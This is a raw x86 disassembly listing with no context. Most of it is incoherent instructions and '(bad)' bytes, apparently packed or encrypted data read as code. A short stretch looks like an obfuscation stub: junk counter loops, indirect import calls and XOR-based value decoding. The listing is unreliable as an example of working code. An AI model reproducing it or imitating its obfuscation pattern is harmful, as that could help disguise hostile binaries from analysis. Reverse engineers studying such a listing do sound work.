  408b9d:	icebp  
  408b9e:	xor    edi,DWORD PTR ds:0x887bb141
  408ba4:	and    al,0xc3
  408ba6:	pop    edx
  408ba7:	pushf  
  408ba8:	dec    ecx
  408ba9:	sahf   
  408baa:	popa   
  408bab:	jmp    0x408bed
  408bad:	pop    edi
  408bae:	and    eax,0xcda351b0
  408bb3:	mov    ch,0x56
  408bb5:	mov    bh,0xa
  408bb7:	hlt    
  408bb8:	inc    ecx
  408bb9:	push   0x4f
  408bbb:	shl    DWORD PTR [ecx],1
  408bbd:	ja     0x408c2e
  408bbf:	ins    BYTE PTR es:[edi],dx
  408bc0:	inc    esp
  408bc1:	test   al,0x70
  408bc3:	dec    ecx
  408bc4:	js     0x408c0f
  408bc6:	cmp    esi,DWORD PTR [ecx]
  408bc8:	mov    ebp,0x5441340f
  408bcd:	in     eax,dx
  408bce:	fcom   st(3)
  408bd0:	pop    ds
  408bd1:	cli    
  408bd2:	xlat   BYTE PTR ds:[ebx]
  408bd3:	inc    edx
  408bd4:	inc    ebx
  408bd5:	add    dl,BYTE PTR [eax+0x41]
  408bd8:	mov    al,dl
  408bda:	mov    al,0x49
  408bdc:	pop    edi
  408bdd:	sub    ecx,ecx
  408bdf:	jae    0x408c39
  408be1:	sbb    ebp,DWORD PTR [ebx]
  408be3:	div    BYTE PTR [ebp+0x19302511]
  408be9:	iret   
  408bea:	mov    ecx,0x11ccca78
  408bef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bf0:	rcr    BYTE PTR [eax+0x37],cl
  408bf3:	repz daa 
  408bf5:	scas   eax,DWORD PTR es:[edi]
  408bf6:	inc    esp
  408bf7:	ins    BYTE PTR es:[edi],dx
  408bf8:	and    al,0xad
  408bfa:	push   edi
  408bfb:	xchg   edx,eax
  408bfc:	das    
  408bfd:	outs   dx,BYTE PTR ds:[esi]
  408bfe:	inc    esi
  408bff:	pop    eax
  408c00:	loope  0x408c13
  408c02:	sub    ch,ch
  408c04:	test   DWORD PTR [ecx],0x4f372bb7
  408c0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c0b:	jns    0x408c34
  408c0d:	sbb    al,0x66
  408c0f:	sbb    DWORD PTR [edx+eiz*1-0x11a27d4],0xa05c9e4b
  408c1a:	lods   al,BYTE PTR ds:[esi]
  408c1b:	mov    bh,0x28
  408c1d:	xchg   edx,eax
  408c1e:	test   DWORD PTR [edi],eax
  408c20:	outs   dx,DWORD PTR es:[esi]
  408c22:	ins    BYTE PTR es:[edi],dx
  408c23:	into   
  408c24:	xor    BYTE PTR [ebp-0x7eefc721],ah
  408c2a:	test   eax,0x91b393b9
  408c2f:	sbb    BYTE PTR [eax+0x29abc944],dl
  408c35:	push   es
  408c36:	fild   QWORD PTR [eax-0x1e1070c7]
  408c3c:	fcmovnb st,st(7)
  408c3e:	mov    al,0xb9
  408c40:	push   ds
  408c41:	jmp    0xdfd4:0x6032978d
  408c48:	inc    ebp
  408c49:	jle    0x408bf7
  408c4b:	ds jmp 0x7f7e:0x3bb2559e
  408c53:	jle    0x408c39
  408c55:	dec    ebx
  408c56:	push   edx
  408c57:	and    al,0xd8
  408c59:	imul   ecx,esi,0xdfcab667
  408c5f:	cmc    
  408c60:	sbb    ebp,DWORD PTR [esi-0x4c]
  408c63:	pop    eax
  408c64:	mov    cl,0x2d
  408c66:	cli    
  408c67:	mov    bh,BYTE PTR [ecx]
  408c69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c6a:	mov    ebx,0x19294238
  408c6f:	xchg   edi,eax
  408c70:	mov    edi,0x4654447b
  408c75:	jp     0x408cb8
  408c77:	xchg   esp,eax
  408c78:	push   edi
  408c79:	rcr    ebx,0x82
  408c7c:	jmp    0x408cec
  408c7e:	jnp    0x408c28
  408c80:	inc    edx
  408c81:	sti    
  408c82:	xor    dh,al
  408c84:	push   0xffffffc8
  408c86:	dec    ebx
  408c87:	(bad)  
  408c89:	rcr    BYTE PTR [ebx+0x40f1b0b],1
  408c8f:	xchg   edx,eax
  408c90:	add    edx,esi
  408c92:	imul   edx,edi
  408c95:	sub    DWORD PTR [eax],edx
  408c97:	mov    eax,DWORD PTR [ebp-0x14]
  408c9a:	jmp    0x408756
  408c9f:	mov    eax,DWORD PTR [ebp-0xc]
  408ca2:	mov    edx,DWORD PTR [ebp-0x18]
  408ca5:	jmp    0x408e2c
  408caa:	test   ecx,ebx
  408cac:	stc    
  408cad:	test   BYTE PTR [ecx+0x64],ah
  408cb0:	sbb    ecx,0x67327607
  408cb6:	or     BYTE PTR [esi-0x23eb3e56],bl
  408cbc:	jle    0x408d3c
  408cbe:	in     al,0x7f
  408cc0:	jle    0x408d40
  408cc2:	and    al,0x2b
  408cc4:	cdq    
  408cc5:	icebp  
  408cc6:	leave  
  408cc7:	fdivrp st(2),st
  408cc9:	add    ecx,eax
  408ccb:	dec    ebx
  408ccc:	fbld   TBYTE PTR [eax-0x4d40c948]
  408cd2:	mov    ecx,0xb976feb0
  408cd7:	inc    esp
  408cd8:	sahf   
  408cd9:	cs fwait
  408cdb:	mov    ch,0xda
  408cdd:	sub    eax,0x98868541
  408ce2:	mov    esp,gs
  408ce4:	jnp    0x408d05
  408ce6:	dec    edx
  408ce7:	ds fwait
  408ce9:	daa    
  408cea:	mov    edx,0xc1f1419b
  408cef:	ja     0x408d18
  408cf1:	adc    BYTE PTR [esi+0x7c],ah
  408cf4:	scas   eax,DWORD PTR es:[edi]
  408cf5:	pushf  
  408cf6:	inc    esp
  408cf7:	xlat   BYTE PTR gs:[ebx]
  408cf9:	dec    ebx
  408cfa:	call   0x4f0c56c5
  408cff:	add    eax,0x168f5c8c
  408d04:	mov    BYTE PTR [esi-0x56929b68],cl
  408d0a:	add    BYTE PTR [eax],dh
  408d0c:	scas   eax,DWORD PTR es:[edi]
  408d0d:	jnp    0x408d3c
  408d0f:	jbe    0x408d55
  408d11:	retf   
  408d12:	lea    ebp,[edi]
  408d14:	cmp    al,0xde
  408d16:	mov    eax,ds:0xd0845484
  408d1b:	jg     0x408d23
  408d1d:	xchg   esp,eax
  408d1e:	mov    esi,0x96ff8fdf
  408d23:	and    dx,WORD PTR [edi]
  408d26:	mov    dl,0x80
  408d28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d29:	je     0x408d41
  408d2b:	and    al,0x7c
  408d2d:	or     al,0xfb
  408d2f:	aad    0x66
  408d31:	jae    0x408da0
  408d33:	xchg   DWORD PTR [eax-0x3f75df79],esp
  408d39:	inc    edx
  408d3a:	xchg   esp,eax
  408d3b:	dec    ecx
  408d3c:	data16 mov WORD PTR fs:[edi],cs
  408d40:	repnz and al,0x5f
  408d43:	jo     0x408ccc
  408d45:	push   esi
  408d46:	sub    BYTE PTR [ecx+0x23894ed2],ah
  408d4c:	stc    
  408d4d:	aam    0xa3
  408d4f:	out    0xdd,al
  408d51:	aad    0xf4
  408d53:	int    0xb1
  408d55:	pushf  
  408d56:	xor    edi,esi
  408d58:	sti    
  408d59:	mov    edx,0xbbdfdc7e
  408d5e:	add    cl,BYTE PTR [edi]
  408d60:	add    cl,dh
  408d62:	dec    BYTE PTR [eax-0x53232acc]
  408d68:	cmp    BYTE PTR [edi+0x131d406a],bh
  408d6e:	cs inc ecx
  408d70:	mov    bh,0x81
  408d72:	push   es
  408d73:	cmc    
  408d74:	inc    ebx
  408d75:	cmp    ah,BYTE PTR [ebp-0x34]
  408d78:	mov    ebp,0xae57f210
  408d7d:	divps  xmm7,XMMWORD PTR [esi-0x37]
  408d81:	loopne 0x408d4f
  408d83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d84:	leave  
  408d85:	lea    ebx,[edx-0x52379bf8]
  408d8b:	xchg   ebx,eax
  408d8c:	xchg   DWORD PTR [esi-0x48],esp
  408d8f:	lea    edi,ds:0x8231fc9e
  408d95:	mov    esp,0xbcb0276e
  408d9a:	inc    ecx
  408d9b:	cmp    dl,BYTE PTR [ecx]
  408d9d:	add    DWORD PTR [ebx+0x5082046],eax
  408da3:	test   BYTE PTR [edx-0x5fed1566],dl
  408da9:	enter  0x645,0x89
  408dad:	mov    WORD PTR [ebp+0x18c6d934],gs
  408db3:	mov    edx,0x13de268a
  408db8:	fucomip st,st(6)
  408dba:	inc    esi
  408dbb:	in     eax,0x71
  408dbd:	mov    cl,0xbd
  408dbf:	inc    ecx
  408dc0:	stc    
  408dc1:	stos   DWORD PTR es:[edi],eax
  408dc2:	call   0x5615d43c
  408dc7:	mov    ah,0x42
  408dc9:	and    eax,0xea31846c
  408dce:	pop    edx
  408dcf:	retf   
  408dd0:	cmp    DWORD PTR [ecx+0x52],ebp
  408dd3:	mov    ebx,0xee89007d
  408dd8:	mov    ch,0x88
  408dda:	outs   dx,BYTE PTR ds:[esi]
  408ddb:	mov    esp,0x38f9e527
  408de0:	jp     0x408e24
  408de2:	daa    
  408de3:	xchg   esp,eax
  408de4:	rol    ch,1
  408de6:	add    dh,ah
  408de8:	or     eax,0x41bf5735
  408ded:	mov    al,0x18
  408def:	das    
  408df0:	mov    ?,WORD PTR [esi+0x1522d083]
  408df6:	into   
  408df7:	fimul  WORD PTR [ecx+0x1fda726a]
  408dfd:	xchg   DWORD PTR [ebx-0x50d20dae],esp
  408e03:	int    0xbb
  408e05:	jns    0x408d89
  408e07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e08:	cld    
  408e09:	shr    DWORD PTR ds:0x21271031,0x26
  408e10:	sbb    DWORD PTR [edi],edx
  408e12:	mov    dh,0x15
  408e14:	jmp    0x408dd1
  408e16:	gs int 0x4a
  408e19:	scas   eax,DWORD PTR es:[edi]
  408e1a:	aad    0x84
  408e1c:	lods   al,BYTE PTR ds:[esi]
  408e1d:	pop    ss
  408e1e:	add    BYTE PTR [edx-0x54636686],al
  408e24:	jbe    0x408dbb
  408e26:	sub    esp,DWORD PTR [ebp+0x3a]
  408e29:	arpl   WORD PTR [edi+eiz*4],si
  408e2c:	xor    eax,edx
  408e2e:	cmp    eax,0x7aa80c5b
  408e33:	je     0x40858a
  408e39:	mov    eax,DWORD PTR [ebp-0x10]
  408e3c:	add    DWORD PTR [eax],0x7403501
  408e42:	jmp    0x40858a
  408e47:	mov    eax,DWORD PTR [ebp-0x1c]
  408e4a:	jmp    0x408fd1
  408e4f:	xor    eax,0xa417048d
  408e54:	xchg   edi,eax
  408e55:	xor    eax,0xaa1dcad
  408e5a:	jmp    0xd3841983
  408e5f:	cli    
  408e60:	fnstsw WORD PTR [esi+0x7e]
  408e63:	in     al,0x7f
  408e65:	jle    0x408ee5
  408e67:	mov    BYTE PTR [edi+0x43],ch
  408e6a:	xchg   edx,eax
  408e6b:	inc    eax
  408e6c:	mov    cs,WORD PTR [eax]
  408e6e:	imul   ebp,DWORD PTR [edi-0x3cf3c8e4],0x5a3aee81
  408e78:	mov    BYTE PTR [ecx+0x1cb53744],cl
  408e7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e7f:	inc    edx
  408e80:	inc    ebp
  408e81:	jmp    0x408e71
  408e83:	ret    0x1908
  408e86:	das    
  408e87:	sbb    BYTE PTR [edx+0x69c6659e],bh
  408e8d:	dec    ebx
  408e8e:	push   edi
  408e8f:	mov    eax,ds:0x7930fca1
  408e94:	cs sti 
  408e96:	call   0x6fcd43a9
  408e9b:	enter  0x2c4f,0x76
  408e9f:	inc    esp
  408ea0:	clc    
  408ea1:	ins    DWORD PTR es:[edi],dx
  408ea2:	or     ebx,ebx
  408ea4:	sbb    al,0xbc
  408ea6:	dec    eax
  408ea7:	jb     0x408e59
  408ea9:	daa    
  408eaa:	(bad)  
  408eab:	push   ebp
  408eac:	mov    ch,0xaf
  408eae:	call   0xa90d41b2
  408eb3:	(bad)  
  408eb5:	les    edi,FWORD PTR [ebx-0x70]
  408eb8:	mov    ?,WORD PTR ds:0xbb00556d
  408ebe:	cld    
  408ebf:	sbb    dh,bh
  408ec1:	xchg   esp,eax
  408ec2:	xchg   ecx,eax
  408ec3:	inc    DWORD PTR ds:0x553f7da
  408ec9:	or     ebp,edx
  408ecb:	fwait
  408ecc:	popf   
  408ecd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ece:	fs mov edi,0xf5d49faf
  408ed4:	(bad)  
  408ed5:	gs fcmovnbe st,st(2)
  408ed8:	iret   
  408ed9:	push   esi
  408eda:	push   edi
  408edb:	sbb    al,0x11
  408edd:	rcr    edx,cl
  408edf:	call   DWORD PTR [edi+0x2c]
  408ee2:	push   ebx
  408ee3:	sbb    eax,0x3e1541d1
  408ee8:	ins    DWORD PTR es:[edi],dx
  408ee9:	shl    DWORD PTR [ebp-0x28],0x5c
  408eed:	jnp    0x408f5c
  408eef:	nop
  408ef0:	jbe    0x408f13
  408ef2:	jge    0x408f5a
  408ef4:	aaa    
  408ef5:	pop    eax
  408ef6:	shr    BYTE PTR [edi+eiz*2+0xf372a7a],cl
  408efd:	leave  
  408efe:	fmul   QWORD PTR [edi-0x57]
  408f01:	pop    edi
  408f02:	xlat   BYTE PTR ds:[ebx]
  408f03:	(bad)  
  408f04:	fdiv   DWORD PTR [esi-0x4594503e]
  408f0a:	inc    edi
  408f0b:	pop    esp
  408f0c:	ins    DWORD PTR es:[edi],dx
  408f0d:	xor    cl,BYTE PTR [eax]
  408f0f:	jno    0x408f08
  408f11:	mov    BYTE PTR [ecx+ecx*2],al
  408f14:	(bad)  
  408f15:	jg     0x408eeb
  408f17:	inc    esi
  408f18:	xchg   edi,eax
  408f19:	(bad)  
  408f1a:	cmc    
  408f1b:	xchg   esi,eax
  408f1c:	jb     0x408ea5
  408f1e:	(bad)  
  408f1f:	test   BYTE PTR fs:[edx+0x25b6a71e],dl
  408f26:	fmul   QWORD PTR [edx-0x15c45ea3]
  408f2c:	xchg   DWORD PTR [edx],ebx
  408f2e:	pop    esp
  408f2f:	mov    cl,0x75
  408f31:	mov    al,0xbb
  408f33:	nop
  408f34:	or     eax,0x225766d2
  408f39:	sbb    ebp,DWORD PTR [edi-0x21]
  408f3c:	and    edi,DWORD PTR [ebp+0x2bf335c6]
  408f42:	rcl    BYTE PTR [ebp+edx*1+0x67],0xd
  408f47:	les    edi,FWORD PTR [ebp+0x25]
  408f4a:	xor    edi,ebp
  408f4c:	jbe    0x408f4c
  408f4e:	dec    ebp
  408f4f:	pop    ss
  408f50:	xor    eax,0xdc8bb17b
  408f55:	cli    
  408f56:	xchg   ecx,eax
  408f57:	xchg   DWORD PTR [esi],ecx
  408f59:	inc    esp
  408f5a:	jl     0x408eec
  408f5c:	popa   
  408f5d:	leave  
  408f5e:	out    dx,al
  408f5f:	jae    0x408f74
  408f61:	jg     0x408fc1
  408f63:	sbb    edx,esp
  408f65:	push   ecx
  408f66:	add    DWORD PTR [ebp-0x3edda750],edx
  408f6c:	sbb    esp,esp
  408f6e:	pop    eax
  408f6f:	xchg   edi,eax
  408f70:	ss xchg edx,eax
  408f72:	pop    ds
  408f73:	es jns 0x408fdc
  408f76:	outs   dx,BYTE PTR ds:[esi]
  408f77:	adc    DWORD PTR [ecx-0x37],esp
  408f7a:	call   0x6bef8627
  408f7f:	jle    0x408fdd
  408f81:	mov    dh,0x6a
  408f83:	and    eax,0xfc26f361
  408f88:	aas    
  408f89:	xor    al,0x5
  408f8b:	pop    ds
  408f8c:	nop
  408f8d:	and    al,0xa0
  408f8f:	or     BYTE PTR [esi-0x39],dl
  408f92:	push   esp
  408f93:	lea    esp,[ecx+eiz*4]
  408f96:	into   
  408f97:	mov    ?,WORD PTR [eax]
  408f99:	cmc    
  408f9a:	sub    al,0x17
  408f9c:	mov    ds:0x5dc474e6,al
  408fa1:	jns    0x408fb8
  408fa3:	cmp    eax,0xc313bce2
  408fa8:	dec    esi
  408fa9:	jle    0x408f3e
  408fab:	cmp    al,0x3e
  408fad:	mov    ds:0x1e9eb36f,al
  408fb2:	xchg   ebx,eax
  408fb3:	pop    es
  408fb4:	mov    dl,0xc0
  408fb6:	outs   dx,DWORD PTR ds:[esi]
  408fb7:	sbb    DWORD PTR [esp+esi*8+0x42fa0829],ebp
  408fbe:	cdq    
  408fbf:	mov    al,ds:0x3897c569
  408fc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fc5:	fimul  WORD PTR [ebp-0x72e93e0c]
  408fcb:	clc    
  408fcc:	inc    esi
  408fcd:	adc    eax,DWORD PTR [esi+0x3839c9b4]
  408fd3:	je     0x40858a
  408fd9:	mov    eax,0x800f1c9a
  408fde:	jmp    0x4088e1
  408fe3:	push   ebp
  408fe4:	mov    ebp,esp
  408fe6:	sub    esp,0x20
  408fe9:	sub    ecx,eax
  408feb:	mov    eax,ds:0x413bde
  408ff0:	and    DWORD PTR ds:0x4336af,0x0
  408ffa:	jmp    0x40900c
  408fff:	mov    ecx,DWORD PTR ds:0x4336af
  409005:	inc    ecx
  409006:	mov    DWORD PTR ds:0x4336af,ecx
  40900c:	cmp    DWORD PTR ds:0x4336af,0x1c
  409013:	jae    0x409040
  409019:	cmp    DWORD PTR ds:0x4336af,0x20
  409020:	jne    0x40903b
  409026:	push   0x4819
  40902b:	push   0x30ae
  409030:	push   0x3675
  409035:	call   DWORD PTR ds:0x412014
  40903b:	jmp    0x408fff
  409040:	mov    eax,DWORD PTR [eax+0x198]
  409046:	mov    DWORD PTR [ebp-0x8],eax
  409049:	and    DWORD PTR ds:0x4336eb,0x0
  409053:	mov    ecx,DWORD PTR ds:0x4336eb
  409059:	inc    ecx
  40905a:	mov    DWORD PTR ds:0x4336eb,ecx
  409060:	cmp    DWORD PTR ds:0x4336eb,0x1c
  409067:	jne    0x409085
  40906d:	push   0x43372f
  409072:	push   0x494f
  409077:	push   0x43379a
  40907c:	push   DWORD PTR [ebp-0x24]
  40907f:	call   DWORD PTR ds:0x412394
  409085:	cmp    DWORD PTR ds:0x4336eb,0x13
  40908c:	jb     0x409053
  409092:	mov    eax,DWORD PTR [ebp+0x8]
  409095:	and    ecx,DWORD PTR ds:0x4336f3
  40909b:	mov    ecx,DWORD PTR [ebp-0x8]
  40909e:	sbb    DWORD PTR ds:0x433703,0x43373b
  4090a8:	push   ebx
  4090a9:	xor    DWORD PTR ds:0x433677,0x7c2a
  4090b3:	push   esi
  4090b4:	mov    esi,DWORD PTR ds:0x4336c7
  4090ba:	mov    ebx,DWORD PTR ds:0x4336db
  4090c0:	sub    ebx,esi
  4090c2:	or     esi,DWORD PTR [esi+ebx*1]
  4090c5:	mov    esi,0x7510854
  4090ca:	xor    eax,esi
  4090cc:	adc    DWORD PTR ds:0x4336a7,0x43362f
  4090d6:	push   edi
  4090d7:	mov    edi,0x32729b
  4090dc:	and    ebx,DWORD PTR ds:0x433627
  4090e2:	add    eax,edi
  4090e4:	mov    DWORD PTR [ecx],eax
  4090e6:	or     DWORD PTR ds:0x43373b,ebx
  4090ec:	lea    eax,[ebp-0x4]
  4090ef:	mov    DWORD PTR [ebp-0x10],eax
  4090f2:	mov    eax,DWORD PTR [ebp+0x8]
  4090f5:	mov    ecx,DWORD PTR [ebp-0x10]
  4090f8:	xor    eax,esi
  4090fa:	sbb    ebx,0x3e7b
  409100:	add    eax,edi
  409102:	mov    DWORD PTR ds:0x433613,0x17
  40910c:	cmp    DWORD PTR ds:0x433613,0x0
  409113:	je     0x40914b
  409119:	cmp    DWORD PTR ds:0x433613,0x27
  409120:	jne    0x409139
  409126:	push   0x3901
  40912b:	push   0x70c3
  409130:	push   DWORD PTR [ebp-0x1c]
  409133:	call   DWORD PTR ds:0x412398
  409139:	mov    ebx,DWORD PTR ds:0x433613
  40913f:	dec    ebx
  409140:	mov    DWORD PTR ds:0x433613,ebx
  409146:	jmp    0x40910c
  40914b:	mov    DWORD PTR [ecx],eax
  40914d:	neg    DWORD PTR ds:0x4336a7
  409153:	jmp    0x409474
  409158:	add    eax,0x73dd76a0
  40915d:	jmp    0x619bf1f7
  409162:	mov    ch,0x2
  409164:	pusha  
  409165:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409166:	inc    eax
  409167:	jo     0x4091c9
  409169:	fidivr DWORD PTR [esi+0x7e]
  40916c:	jp     0x4091eb
  40916e:	jle    0x4091ee
  409170:	sub    BYTE PTR [edx],bh
  409172:	mov    al,ds:0xbb0d4a9f
  409177:	xor    eax,0xbfc22e90
  40917c:	xchg   esp,eax
  40917d:	pop    edx
  40917e:	shl    BYTE PTR [ecx],cl
  409180:	inc    esi
  409181:	nop
  409182:	mov    edi,?
  409184:	and    eax,0x48b3eded
  409189:	xor    al,0x29
  40918b:	adc    BYTE PTR [edi+0x52805fd],al
  409191:	lods   al,BYTE PTR ds:[esi]
  409192:	push   edi
  409193:	xor    eax,0xf6c6d337
  409198:	sub    dl,al
  40919a:	mov    ebx,0x8b162628
  40919f:	sub    eax,0x5f2b18c0
  4091a4:	sbb    ecx,eax
  4091a6:	pop    ebx
  4091a7:	and    DWORD PTR [edi],ebx
  4091a9:	push   ds
  4091aa:	mov    ch,0x93
  4091ac:	sbb    BYTE PTR [edx],cl
  4091ae:	adc    DWORD PTR [esi+0x79],eax
  4091b1:	jbe    0xe451c239
  4091b7:	mov    esi,0xa33bef67
  4091bc:	fcmovu st,st(1)
  4091be:	retf   0x2144
  4091c1:	adc    eax,DWORD PTR [ebx-0x34]
  4091c4:	and    dh,bl
  4091c6:	push   ecx
  4091c7:	test   DWORD PTR [eax+ecx*8+0x53af2d15],0x4412b1e1
  4091d2:	pop    ecx
  4091d3:	jne    0x409191
  4091d5:	dec    ecx
  4091d6:	lods   al,BYTE PTR ds:[esi]
  4091d7:	sbb    ch,dh
  4091d9:	aam    0x71
  4091db:	in     eax,0xc6
  4091dd:	push   esp
  4091de:	cmp    BYTE PTR ds:0x7668049f,dh
  4091e4:	dec    ebx
  4091e5:	sbb    al,dl
  4091e7:	sar    BYTE PTR [eax-0x33],cl
  4091ea:	lods   eax,DWORD PTR cs:[esi]
  4091ec:	push   DWORD PTR [ecx]
  4091ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091ef:	retf   
  4091f0:	test   DWORD PTR [ecx],esi
  4091f2:	pop    esp
  4091f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091f4:	push   edx
  4091f5:	fucom  st(7)
  4091f7:	sub    BYTE PTR [edx],dh
  4091f9:	ds push 0xa
  4091fc:	popa   
  4091fd:	mov    eax,ds:0xf7af10ed
  409202:	imul   eax,DWORD PTR [edx+0x4e905c15],0x3e
  409209:	rol    edi,0xd6
  40920c:	sbb    ebx,DWORD PTR [edx+0x3ab1e3d9]
  409212:	(bad)
  409216:	stc    
  409217:	out    0xb8,al
  409219:	cld    
  40921a:	mov    esi,0xbffbf1a5
  40921f:	ins    BYTE PTR es:[edi],dx
  409220:	ss imul edx
  409223:	cmp    DWORD PTR [ecx-0x269e1ba3],esp
  409229:	push   ds
  40922a:	in     eax,dx
  40922b:	sub    DWORD PTR [ecx+0x792cbe6a],edi
  409231:	push   0x15541870
  409236:	mov    esi,eax
  409238:	push   ebp
  409239:	cdq    
  40923a:	xor    eax,0x5abae4e8
  40923f:	js     0x409294
  409241:	repnz iret 
  409243:	add    DWORD PTR [ebx-0x30eb4b9],0x8163207e
  40924d:	mov    ebp,DWORD PTR [edx]
  40924f:	ins    BYTE PTR es:[edi],dx
  409250:	mov    cl,0xe7
  409252:	mov    ebx,0x99a86273
  409257:	jno    0x40921d
  409259:	push   esi
  40925a:	inc    eax
  40925b:	mov    ch,0x3a
  40925d:	push   ss
  40925e:	aas    
  40925f:	sub    BYTE PTR [edx],bl
  409261:	in     eax,0x2d
  409263:	shr    DWORD PTR [ebx+0x74328126],1
  409269:	cmp    DWORD PTR [esi+0x62],ebp
  40926c:	fdivr  QWORD PTR [eax-0xc95724f]
  409272:	in     eax,dx
  409273:	call   0x9b96d806
  409278:	xchg   edi,eax
  409279:	inc    edi
  40927a:	jae    0x409221
  40927c:	adc    al,0x5e
  40927e:	repz or BYTE PTR [edx-0x2f],bh
  409282:	sbb    BYTE PTR [esp+edi*4+0x7a987984],0x71
  40928a:	mov    gs,WORD PTR ds:0xdae4acb9
  409290:	retf   0xc0aa
  409293:	lahf   
  409294:	lock pop esi
  409296:	or     al,0xb1
  409298:	push   0x75
  40929a:	xor    DWORD PTR [edx],ebx
  40929c:	inc    eax
  40929d:	mov    al,ds:0xc71be258
  4092a2:	xchg   edx,eax
  4092a3:	call   0xfd06c8fe
  4092a8:	dec    ebx
  4092a9:	lods   al,BYTE PTR ds:[esi]
  4092aa:	inc    esp
  4092ab:	xor    DWORD PTR [edx+edi*2],0x820b4f2c
  4092b2:	fadd   DWORD PTR [ebx+eax*1+0x25]
  4092b6:	cdq    
  4092b7:	in     eax,0x2e
  4092b9:	int3   
  4092ba:	ret    0x7696
  4092bd:	inc    edx
  4092be:	cld    
  4092bf:	mov    ch,0x21
  4092c1:	sahf   
  4092c2:	arpl   WORD PTR [esi-0x3fe75845],bx
  4092c8:	(bad)  
  4092c9:	aas    
  4092ca:	and    DWORD PTR [ebx+0x449445d9],ebx
  4092d0:	add    eax,0x9794b34f
  4092d5:	xor    eax,0xd8de11a7
  4092da:	fidivr WORD PTR [edi-0x1c]
  4092dd:	xchg   ecx,eax
  4092de:	mov    eax,0xb1cec5f3
  4092e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092e4:	push   cs
  4092e5:	push   ds
  4092e6:	jbe    0x4092f0
  4092e8:	mov    al,ds:0x20345bee
  4092ed:	stos   BYTE PTR es:[edi],al
  4092ee:	pop    ss
  4092ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092f0:	sbb    DWORD PTR [esi-0x4],ebx
  4092f3:	jno    0x40927f
  4092f5:	xor    BYTE PTR [ebx+0x2c],ah
  4092f8:	push   0xbeea97a0
  4092fd:	and    eax,0x8f123303
  409302:	sub    ah,0xed
  409305:	sbb    eax,0x2ecc33c4
  40930a:	xchg   ebx,eax
  40930b:	mov    dl,0x38
  40930d:	mov    BYTE PTR [edi+0x44],dh
  409310:	jo     0x40935b
  409312:	xor    ebp,DWORD PTR [edx+0x38]
  409315:	or     bh,dh
  409317:	jp     0x4092ae
  409319:	cmp    dl,bl
  40931b:	in     eax,dx
  40931c:	cmp    dl,BYTE PTR [eax-0x16]
  40931f:	and    eax,0xa2a228c3
  409324:	xor    al,0x69
  409326:	(bad)  
  409327:	popf   
  409328:	and    dh,dl
  40932a:	mov    eax,0x6672c6d6
  40932f:	mov    bl,0x69
  409331:	scas   al,BYTE PTR es:[edi]
  409332:	shr    DWORD PTR [edx+0x535f7344],cl
  409338:	fadd   QWORD PTR [edi+0x46]
  40933b:	and    eax,0xe25e222
  409340:	jmp    0x6af2:0xe200d0ec
  409347:	(bad)  
  409348:	pop    esi
  409349:	push   ss
  40934a:	jmp    0xcef0f046
  40934f:	pop    ebp
  409350:	test   BYTE PTR [edx],dl
  409352:	cmp    DWORD PTR [edx+edx*1+0x25],edx
  409356:	arpl   WORD PTR [esi+0x3e],si
  409359:	in     eax,dx
  40935a:	push   ss
  40935b:	fucom  st(1)
  40935d:	and    BYTE PTR [ecx-0x424419e1],bl
  409363:	loop   0x4093c1
  409365:	push   eax
  409366:	lds    ebx,FWORD PTR [eax+eax*1-0x1e617761]
  40936d:	mov    ch,0xe5
  40936f:	popf   
  409370:	sti    
  409371:	sub    eax,0x160bbf87
  409376:	ins    BYTE PTR es:[edi],dx
  409377:	cmc    
  409378:	push   ebx
  409379:	or     ecx,DWORD PTR [ebx]
  40937b:	mov    cl,0xed
  40937d:	jle    0x4093db
  40937f:	mov    eax,0xf23c9116
  409384:	mov    DWORD PTR [esi-0x2bba917f],ebx
  40938a:	push   cs
  40938b:	fwait
  40938c:	push   edx
  40938d:	cli    
  40938e:	loope  0x409374
  409390:	jae    0x4093ae
  409392:	push   ds
  409393:	dec    edx
  409394:	mov    cl,0x89
  409396:	inc    edx
  409397:	daa    
  409398:	mov    al,ds:0x219e7025
  40939d:	dec    esi
  40939e:	or     al,0x3c
  4093a0:	retf   
  4093a1:	cmp    bh,BYTE PTR [esi-0x55]
  4093a4:	jnp    0x409377
  4093a6:	and    eax,0x124504d2
  4093ab:	fdiv   DWORD PTR [ebp+0x4b]
  4093ae:	(bad)  
  4093af:	scas   eax,DWORD PTR es:[edi]
  4093b0:	call   0xed5c:0xf2cce220
  4093b7:	adc    BYTE PTR [edx-0x1a23b9a9],al
  4093bd:	mov    eax,ds:0x9b4bad75
  4093c2:	push   edx
  4093c3:	xchg   ecx,eax
  4093c4:	imul   edx,DWORD PTR ds:0xb92ac68f,0xa167f021
  4093ce:	push   0xde2602cf
  4093d3:	inc    edx
  4093d4:	jle    0x4093fc
  4093d6:	xor    eax,0x8d4d52bd
  4093db:	fwait
  4093dc:	inc    eax
  4093dd:	mov    ds:0x4560ef4e,al
  4093e2:	mov    ds:0x886d05b3,al
  4093e7:	into   
  4093e8:	push   si
  4093ea:	push   cs
  4093eb:	shr    edi,0x27
  4093ee:	daa    
  4093ef:	xchg   ecx,eax
  4093f0:	cmp    BYTE PTR [ebx-0x39264479],cl
  4093f6:	test   BYTE PTR [edi+0x75bbcaf7],dl
  4093fc:	mov    edx,0xf3d75568
  409401:	push   ss
  409402:	push   edi
  409403:	adc    esi,DWORD PTR [esi+0x34]
  409406:	daa    
  409407:	xchg   edi,eax
  409408:	jmp    0x6003:0x9b40597d
  40940f:	sub    eax,0x6b73a88c
  409414:	popf   
  409415:	sahf   
  409416:	or     BYTE PTR [edi],bl
  409418:	data16 cmp BYTE PTR [edx],0x95
  40941c:	or     DWORD PTR [ecx+0x68],ecx
  40941f:	sbb    al,0x44
  409421:	ret    
